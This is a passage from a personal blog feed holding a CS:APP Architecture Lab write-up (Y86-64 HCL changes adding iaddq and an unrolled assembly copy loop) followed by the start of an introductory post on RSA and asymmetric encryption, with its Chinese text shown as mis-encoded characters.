class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line">#<span class="comment">/* $begin seq-all-hcl */</span></span><br><span class="line">####################################################################</span><br><span class="line">#  HCL Description of Control <span class="keyword">for</span> Single Cycle Y86<span class="number">-64</span> Processor SEQ   #</span><br><span class="line">#  Copyright (C) Randal E. Bryant, David R. O<span class="number">&#x27;</span>Hallaron, <span class="number">2010</span>       #</span><br><span class="line">####################################################################</span><br><span class="line"></span><br><span class="line">## Your task is to implement the iaddq instruction</span><br><span class="line">## The file contains a declaration of the icodes</span><br><span class="line">#<span class="meta"># for iaddq (IIADDQ)</span></span><br><span class="line">## Your job is to add the rest of the logic to make it work</span><br><span class="line"></span><br><span class="line">####################################################################</span><br><span class="line">#    C Include<span class="number">&#x27;</span>s.  Don<span class="number">&#x27;</span>t alter these                               #</span><br><span class="line">###################################################################<span class="meta">#</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">quote <span class="meta-string">&#x27;#include &lt;stdio.h&gt;&#x27;</span></span></span><br><span class="line">quote <span class="string">&#x27;#include &quot;isa.h&quot;&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;#include &quot;sim.h&quot;&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;int sim_main(int argc, char *argv[]);&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;word_t gen_pc()&#123;return 0;&#125;&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;int main(int argc, char *argv[])&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;  &#123;plusmode=0;return sim_main(argc,argv);&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">####################################################################</span><br><span class="line">#    Declarations.  Do <span class="keyword">not</span> change/remove/<span class="keyword">delete</span> any of these       #</span><br><span class="line">####################################################################</span><br><span class="line"></span><br><span class="line">##### Symbolic representation of Y86<span class="number">-64</span> Instruction Codes ############<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig INOP     <span class="meta-string">&#x27;I_NOP&#x27;</span></span></span><br><span class="line">wordsig IHALT    <span class="string">&#x27;I_HALT&#x27;</span></span><br><span class="line">wordsig IRRMOVQ    <span class="string">&#x27;I_RRMOVQ&#x27;</span></span><br><span class="line">wordsig IIRMOVQ    <span class="string">&#x27;I_IRMOVQ&#x27;</span></span><br><span class="line">wordsig IRMMOVQ    <span class="string">&#x27;I_RMMOVQ&#x27;</span></span><br><span class="line">wordsig IMRMOVQ    <span class="string">&#x27;I_MRMOVQ&#x27;</span></span><br><span class="line">wordsig IOPQ    <span class="string">&#x27;I_ALU&#x27;</span></span><br><span class="line">wordsig IJXX    <span class="string">&#x27;I_JMP&#x27;</span></span><br><span class="line">wordsig ICALL    <span class="string">&#x27;I_CALL&#x27;</span></span><br><span class="line">wordsig IRET    <span class="string">&#x27;I_RET&#x27;</span></span><br><span class="line">wordsig IPUSHQ    <span class="string">&#x27;I_PUSHQ&#x27;</span></span><br><span class="line">wordsig IPOPQ    <span class="string">&#x27;I_POPQ&#x27;</span></span><br><span class="line"># Instruction code <span class="keyword">for</span> iaddq instruction</span><br><span class="line">wordsig IIADDQ    <span class="string">&#x27;I_IADDQ&#x27;</span></span><br><span class="line"></span><br><span class="line">##### Symbolic represenations of Y86<span class="number">-64</span> function codes                  ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig FNONE    <span class="meta-string">&#x27;F_NONE&#x27;</span>        # Default function code</span></span><br><span class="line"></span><br><span class="line">##### Symbolic representation of Y86<span class="number">-64</span> Registers referenced explicitly ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig RRSP     <span class="meta-string">&#x27;REG_RSP&#x27;</span>        # Stack Pointer</span></span><br><span class="line">wordsig RNONE    <span class="string">&#x27;REG_NONE&#x27;</span>       # Special value indicating <span class="string">&quot;no register&quot;</span></span><br><span class="line"></span><br><span class="line">##### ALU Functions referenced explicitly                            ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig ALUADD    <span class="meta-string">&#x27;A_ADD&#x27;</span>        # ALU should add its arguments</span></span><br><span class="line"></span><br><span class="line">##### Possible instruction status values                             ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig SAOK    <span class="meta-string">&#x27;STAT_AOK&#x27;</span>    # Normal execution</span></span><br><span class="line">wordsig SADR    <span class="string">&#x27;STAT_ADR&#x27;</span>    # Invalid memory address</span><br><span class="line">wordsig SINS    <span class="string">&#x27;STAT_INS&#x27;</span>    # Invalid instruction</span><br><span class="line">wordsig SHLT    <span class="string">&#x27;STAT_HLT&#x27;</span>    # Halt instruction encountered</span><br><span class="line"></span><br><span class="line">##### Signals that can be referenced by control logic ####################</span><br><span class="line"></span><br><span class="line">##### Fetch stage inputs        ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig pc <span class="meta-string">&#x27;pc&#x27;</span>                # Program counter</span></span><br><span class="line">##### Fetch stage computations        ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig imem_icode <span class="meta-string">&#x27;imem_icode&#x27;</span>        # icode field from instruction memory</span></span><br><span class="line">wordsig imem_ifun  <span class="string">&#x27;imem_ifun&#x27;</span>         <span class="meta"># ifun field from instruction memory</span></span><br><span class="line">wordsig icode      <span class="string">&#x27;icode&#x27;</span>        # Instruction control code</span><br><span class="line">wordsig ifun      <span class="string">&#x27;ifun&#x27;</span>        # Instruction function</span><br><span class="line">wordsig rA      <span class="string">&#x27;ra&#x27;</span>            # rA field from instruction</span><br><span class="line">wordsig rB      <span class="string">&#x27;rb&#x27;</span>            # rB field from instruction</span><br><span class="line">wordsig valC      <span class="string">&#x27;valc&#x27;</span>        # Constant from instruction</span><br><span class="line">wordsig valP      <span class="string">&#x27;valp&#x27;</span>        # Address of following instruction</span><br><span class="line">boolsig imem_error <span class="string">&#x27;imem_error&#x27;</span>        # Error signal from instruction memory</span><br><span class="line">boolsig instr_valid <span class="string">&#x27;instr_valid&#x27;</span>    # Is fetched instruction valid?</span><br><span class="line"></span><br><span class="line">##### Decode stage computations        ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig valA    <span class="meta-string">&#x27;vala&#x27;</span>            # Value from register A port</span></span><br><span class="line">wordsig valB    <span class="string">&#x27;valb&#x27;</span>            # Value from <span class="keyword">register</span> B port</span><br><span class="line"></span><br><span class="line">##### Execute stage computations    ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig valE    <span class="meta-string">&#x27;vale&#x27;</span>            # Value computed by ALU</span></span><br><span class="line">boolsig Cnd    <span class="string">&#x27;cond&#x27;</span>            # Branch test</span><br><span class="line"></span><br><span class="line">##### Memory stage computations        ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig valM    <span class="meta-string">&#x27;valm&#x27;</span>            # Value read from memory</span></span><br><span class="line">boolsig dmem_error <span class="string">&#x27;dmem_error&#x27;</span>        # Error signal from data memory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">####################################################################</span><br><span class="line">#    Control Signal Definitions.                                   #</span><br><span class="line">####################################################################</span><br><span class="line"></span><br><span class="line">################ Fetch Stage     ###################################</span><br><span class="line"></span><br><span class="line"># Determine instruction code</span><br><span class="line">word icode = [</span><br><span class="line">    imem_error: INOP;</span><br><span class="line">    <span class="number">1</span>: imem_icode;        # Default: get from instruction memory</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"># Determine instruction function</span><br><span class="line">word ifun = [</span><br><span class="line">    imem_error: FNONE;</span><br><span class="line">    <span class="number">1</span>: imem_ifun;        # Default: get from instruction memory</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> instr_valid = icode in </span><br><span class="line">    &#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,</span><br><span class="line">           IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a regid byte?</span><br><span class="line"><span class="keyword">bool</span> need_regids =</span><br><span class="line">    icode in &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, </span><br><span class="line">             IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a constant word?</span><br><span class="line"><span class="keyword">bool</span> need_valC =</span><br><span class="line">    icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line">################ Decode Stage    ###################################</span><br><span class="line"></span><br><span class="line">## What <span class="keyword">register</span> should be used as the A source?</span><br><span class="line">word srcA = [</span><br><span class="line">    icode in &#123; IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ  &#125; : rA;</span><br><span class="line">    icode in &#123; IPOPQ, IRET &#125; : RRSP;</span><br><span class="line">    <span class="number">1</span> : RNONE; # Don<span class="number">&#x27;</span>t need <span class="keyword">register</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What <span class="keyword">register</span> should be used as the B source?</span><br><span class="line">word srcB = [</span><br><span class="line">    icode in &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  &#125; : rB;</span><br><span class="line">    icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">    <span class="number">1</span> : RNONE;  # Don<span class="number">&#x27;</span>t need <span class="keyword">register</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What <span class="keyword">register</span> should be used as the E destination?</span><br><span class="line">word dstE = [</span><br><span class="line">    icode in &#123; IRRMOVQ &#125; &amp;&amp; Cnd : rB;</span><br><span class="line">    icode in &#123; IIRMOVQ, IOPQ, IIADDQ&#125; : rB;</span><br><span class="line">    icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">    <span class="number">1</span> : RNONE;  # Don<span class="number">&#x27;</span>t write any <span class="keyword">register</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What <span class="keyword">register</span> should be used as the M destination?</span><br><span class="line">word dstM = [</span><br><span class="line">    icode in &#123; IMRMOVQ, IPOPQ &#125; : rA;</span><br><span class="line">    <span class="number">1</span> : RNONE;  # Don<span class="number">&#x27;</span>t write any <span class="keyword">register</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">################ Execute Stage   ###################################</span><br><span class="line"></span><br><span class="line">## Select input A to ALU</span><br><span class="line">word aluA = [</span><br><span class="line">    icode in &#123; IRRMOVQ, IOPQ &#125; : valA;</span><br><span class="line">    icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125; : valC;</span><br><span class="line">    icode in &#123; ICALL, IPUSHQ &#125; : <span class="number">-8</span>;</span><br><span class="line">    icode in &#123; IRET, IPOPQ &#125; : <span class="number">8</span>;</span><br><span class="line">    # Other instructions don<span class="number">&#x27;</span>t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select input B to ALU</span><br><span class="line">word aluB = [</span><br><span class="line">    icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, </span><br><span class="line">              IPUSHQ, IRET, IPOPQ, IIADDQ &#125; : valB;</span><br><span class="line">    icode in &#123; IRRMOVQ, IIRMOVQ &#125; : <span class="number">0</span>;</span><br><span class="line">    # Other instructions don<span class="number">&#x27;</span>t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Set the ALU function</span><br><span class="line">word alufun = [</span><br><span class="line">    icode == IOPQ : ifun;</span><br><span class="line">    <span class="number">1</span> : ALUADD;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Should the condition codes be updated?</span><br><span class="line">+<span class="keyword">bool</span> set_cc = icode in &#123; IOPQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line">################ Memory Stage    ###################################</span><br><span class="line"></span><br><span class="line">## Set read control signal</span><br><span class="line"><span class="keyword">bool</span> mem_read = icode in &#123; IMRMOVQ, IPOPQ, IRET &#125;;</span><br><span class="line"></span><br><span class="line">## Set write control signal</span><br><span class="line"><span class="keyword">bool</span> mem_write = icode in &#123; IRMMOVQ, IPUSHQ, ICALL &#125;;</span><br><span class="line"></span><br><span class="line">## Select memory address</span><br><span class="line">word mem_addr = [</span><br><span class="line">    icode in &#123; IRMMOVQ, IPUSHQ, ICALL, IMRMOVQ &#125; : valE;</span><br><span class="line">    icode in &#123; IPOPQ, IRET &#125; : valA;</span><br><span class="line">    # Other instructions don<span class="number">&#x27;</span>t need address</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select memory input data</span><br><span class="line">word mem_data = [</span><br><span class="line">    # Value from <span class="keyword">register</span></span><br><span class="line">    icode in &#123; IRMMOVQ, IPUSHQ &#125; : valA;</span><br><span class="line">    # Return PC</span><br><span class="line">    icode == ICALL : valP;</span><br><span class="line">    # Default: Don<span class="number">&#x27;</span>t write anything</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Determine instruction status</span><br><span class="line">word Stat = [</span><br><span class="line">    imem_error || dmem_error : SADR;</span><br><span class="line">    !instr_valid: SINS;</span><br><span class="line">    icode == IHALT : SHLT;</span><br><span class="line">    <span class="number">1</span> : SAOK;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">################ Program Counter Update ############################</span><br><span class="line"></span><br><span class="line">## What address should instruction be fetched at</span><br><span class="line"></span><br><span class="line">word new_pc = [</span><br><span class="line">    # Call.  Use instruction constant</span><br><span class="line">    icode == ICALL : valC;</span><br><span class="line">    # Taken branch.  Use instruction constant</span><br><span class="line">    icode == IJXX &amp;&amp; Cnd : valC;</span><br><span class="line">    # Completion of RET instruction.  Use value from <span class="built_in">stack</span></span><br><span class="line">    icode == IRET : valM;</span><br><span class="line">    # Default: Use incremented PC</span><br><span class="line">    <span class="number">1</span> : valP;</span><br><span class="line">];</span><br><span class="line">#<span class="comment">/* $end seq-all-hcl */</span></span><br></pre></td></tr></table></figure><p>PS:å’±è¿™ä¸ªå®éªŒæ²¡æœ‰è‡ªå·±ä½œè¿‡ï¼Œä¸Šé¢çš„ä¿®æ”¹æ–¹å¼å‚ç…§äº†åˆ«çš„å¸ˆå‚…çš„wpï¼Œç„¶åæˆ‘å…¶å®çªç„¶å‘ç°æˆ‘ç›´æ¥æµ‹è¯„ä¹Ÿæ˜¯ç›´æ¥æ»¡æ‰çš„ï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼Œæ‰€ä»¥è¿™ä¸ªè¿˜æ˜¯ä¸èƒ½ç®—æˆ‘è‡ªå·±å†™çš„ï¼Œæˆ‘ä¹Ÿæ˜¯çœŸä¸ä¼šï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“å“ªé‡Œéœ€è¦æ·»åŠ ï¼Œä¸ºä»€ä¹ˆä»¥åŠå®ƒå·¥ä½œçš„åŸç†æ˜¯çœŸçš„ä¸çŸ¥é“ï¼Œä»¥åå˜å¼ºäº†çœ‹çœ‹è¿™é‡Œèƒ½ä¸èƒ½æ›´æ–°ä¸€ä¸‹è§£å†³è¿™ä¸ªé—®é¢˜å§ã€‚<code>qwq</code></p><p><img src="https://i.loli.net/2021/05/11/dsAba43ELxCyrSl.png" alt="archlab_PartB_1.png"></p><h1 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h1><p>Part Cåœ¨å¯’å‡çš„é€†å‘åŸ¹è®­ä¸­æˆ‘è¿˜æ˜¯è®°å¾—å¾ˆæ¸…æ¥šçš„ï¼Œå¾ªç¯æ¬¡æ•°ç¼©å‡å¯ä»¥ç”¨æ¯æ¬¡ç§»åŠ¨å…«ä¸ªå­—èŠ‚ï¼Œå¾ªç¯æ‰§è¡Œ[len/8]æ¬¡ï¼Œç„¶åå†ä¸€å­—èŠ‚ä¸€å­—èŠ‚ç§»åŠ¨len%8æ¬¡ï¼Œåˆ©ç”¨è¿™ä¸ªæ€è·¯å»ä¼˜åŒ–memcpyå‡½æ•°æ¥ç€çš„ã€‚</p><p><img src="https://i.loli.net/2021/05/11/mqklds3JaxiROow.png" alt="archlab_PartC_2.png"></p><p>ç„¶åå†™å‡ºä¼˜åŒ–çš„æ€è·¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line">    # Loop header</span><br><span class="line">    xorq %rax,%rax        # count = 0;</span><br><span class="line">    iaddq $-4, %rdx</span><br><span class="line">    jle EQ0</span><br><span class="line"></span><br><span class="line">Npos0:</span><br><span class="line">    mrmovq (%rdi), %r10</span><br><span class="line">    mrmovq 8(%rdi), %r11</span><br><span class="line">    mrmovq 16(%rdi), %r12</span><br><span class="line">    mrmovq 24(%rdi), %r13</span><br><span class="line">    mrmovq 32(%rdi), %r14</span><br><span class="line">    rmmovq %r10, (%rsi)</span><br><span class="line">    andq %r10, %r10        # val &lt;= 0?</span><br><span class="line">    jle Npos1</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Npos1:</span><br><span class="line">    rmmovq %r11, 8(%rsi)</span><br><span class="line">    andq %r11, %r11        # val &lt;= 0?</span><br><span class="line">    jle Npos2</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Npos2:</span><br><span class="line">    rmmovq %r12, 16(%rsi)</span><br><span class="line">    andq %r12, %r12        # val &lt;= 0?</span><br><span class="line">    jle Npos3</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Npos3:</span><br><span class="line">    rmmovq %r13, 24(%rsi)</span><br><span class="line">    andq %r13, %r13    # val &lt;= 0?</span><br><span class="line">    jle Npos4</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Npos4:</span><br><span class="line">    rmmovq %r14, 32(%rsi)</span><br><span class="line">    andq %r14, %r14    # val &lt;= 0?</span><br><span class="line">    jle Tail</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Tail:</span><br><span class="line">    iaddq $40, %rsi</span><br><span class="line">    iaddq $40, %rdi</span><br><span class="line">    iaddq $-5, %rdx</span><br><span class="line">    jg Npos0</span><br><span class="line"></span><br><span class="line">EQ0:</span><br><span class="line">    iaddq $4, %rdx</span><br><span class="line">    jle Done</span><br><span class="line">    mrmovq (%rdi), %r10</span><br><span class="line">    mrmovq 8(%rdi), %r11</span><br><span class="line">    rmmovq %r10, (%rsi)</span><br><span class="line">    andq %r10, %r10</span><br><span class="line">    jle EQ1</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">EQ1:</span><br><span class="line">    iaddq $-1, %rdx</span><br><span class="line">    jle Done</span><br><span class="line">    rmmovq %r11, 8(%rsi)</span><br><span class="line">    andq %r11, %r11</span><br><span class="line">    jle EQ2</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">EQ2:</span><br><span class="line">    iaddq $-1, %rdx</span><br><span class="line">    jle Done</span><br><span class="line">    mrmovq 16(%rdi), %r12</span><br><span class="line">    rmmovq %r12, 16(%rsi)</span><br><span class="line">    andq %r12, %r12</span><br><span class="line">    jle EQ3</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">EQ3:</span><br><span class="line">    iaddq $-1, %rdx</span><br><span class="line">    jle Done</span><br><span class="line">    mrmovq 24(%rdi), %r13</span><br><span class="line">    rmmovq %r13, 24(%rsi)</span><br><span class="line">    andq %r13, %r13</span><br><span class="line">    jle Done</span><br><span class="line">    iaddq $1, %rax</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/11/2ZdkDcsWQiEqRIx.png" alt="archlab_PartC_1.png"></p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RSAè§£å¯†</title>
      <link href="/2021/05/08/RSA/"/>
      <url>/2021/05/08/RSA/</url>
      
        <content type="html"><![CDATA[<p><code>RSA</code>è§£å¯†ç®€ä»‹:<code>RSA</code>æ˜¯1977å¹´ç”±ç½—çº³å¾·Â·æç»´æ–¯ç‰¹ï¼ˆ<code>Ron Rivest</code>ï¼‰ã€é˜¿è¿ªÂ·è¨è«å°”ï¼ˆ<code>Adi Shamir</code>ï¼‰å’Œä¼¦çº³å¾·Â·é˜¿å¾·æ›¼ï¼ˆ<code>Leonard Adleman</code>ï¼‰ä¸€èµ·æå‡ºçš„ã€‚å½“æ—¶ä»–ä»¬ä¸‰äººéƒ½åœ¨éº»çœç†å·¥å­¦é™¢å·¥ä½œã€‚<code>RSA</code>å°±æ˜¯ä»–ä»¬ä¸‰äººå§“æ°å¼€å¤´å­—æ¯æ‹¼åœ¨ä¸€èµ·ç»„æˆçš„ ã€‚(from ç™¾åº¦ç™¾ç§‘)</p><span id="more"></span><h1 id="éå¯¹ç§°åŠ å¯†"><a href="#éå¯¹ç§°åŠ å¯†" class="headerlink" title="éå¯¹ç§°åŠ å¯†"></a>éå¯¹ç§°åŠ å¯†</h1><p>æˆ‘ä»¬å¹³æ—¶å­¦ä¹ çš„åŠ å¯†å¤šæ˜¯å¯¹ç§°åŠ å¯†ï¼Œéå¯¹ç§°åŠ å¯†ç›¸æ¯”äºå¯¹ç§°åŠ å¯†çš„åŒºåˆ«å°±æ˜¯:åŠ å¯†å’Œè§£å¯†ç”¨çš„ä¸æ˜¯åŒä¸€ä¸ªå¯†é’¥ã€‚å‡å¦‚<code>Alice</code>å’ŒBobæƒ³åœ¨ä¸€ä¸ªä¸å®‰å…¨çš„çº¿è·¯ä¸Šé€šä¿¡ï¼Œä»–ä»¬åœ¨ç”¨è¿™ä¸ªä¿¡æ¯äº¤æµä¹‹å‰æ²¡æœ‰ä»»ä½•pyçš„ä¿¡æ¯(å³:ä»–ä»¬ä¸€å¼€å§‹ä¸å­˜åœ¨æœ‰ä¸”ä»…æœ‰ä»–ä»¬ä¸¤ä¸ªäººçŸ¥é“çš„ä¿¡æ¯)ï¼Œè€Œåœ¨è¿™æ¡çº¿è·¯ä¸Šé€šä¿¡çš„æ‰€æœ‰ä¿¡æ¯éƒ½ä¼šè¢«ç¬¬ä¸‰æ–¹çªƒå¬è€…Eveæ‰€è·å¾—ã€‚é—®:å¦‚ä½•ä¸è®©çªƒå¬è€…Eveç›‘å¬åˆ°<code>Alice</code>å’ŒBobçš„å¯¹è¯ï¼Ÿ</p><p>å½“ç„¶æˆ‘ä»¬å¿…é¡»å¯¹å‘é€çš„ä¿¡æ¯è¿›è¡ŒåŠ å¯†ï¼Œè€Œå¯¹ç§°åŠ å¯†å¿…é¡»ä¸¤äººæå‰è·å–å¯†é’¥å’ŒåŠ å¯†æ–¹å¼ï¼Œè¿™äº›ä¿¡æ¯éƒ½æ˜¯ä»–ä»¬ä¸€å¼€å§‹æ‰€ä¸çŸ¥é“çš„ï¼Œå› æ­¤éœ€è¦åœ¨è¿™æ¡çº¿è·¯ä¸Šå‘ŠçŸ¥å¯†é’¥å’ŒåŠ å¯†æ–¹å¼ï¼Œå¦‚æœåœ¨è¿™æ¡çº¿è·¯ä¸Šå‘ŠçŸ¥ï¼Œé‚£ä¹ˆEveä¹Ÿèƒ½å¯¹åŠ å¯†çš„æ•°æ®è§£å¯†ä»è€Œç›‘å¬ä»–ä»¬çš„é€šè¯å†…å®¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬é‡‡å–éå¯¹ç§°åŠ å¯†æ˜¯æœ€ä¿é™©çš„ã€‚æˆ‘åªå‘Šè¯‰ä½ æ€ä¹ˆåŠ 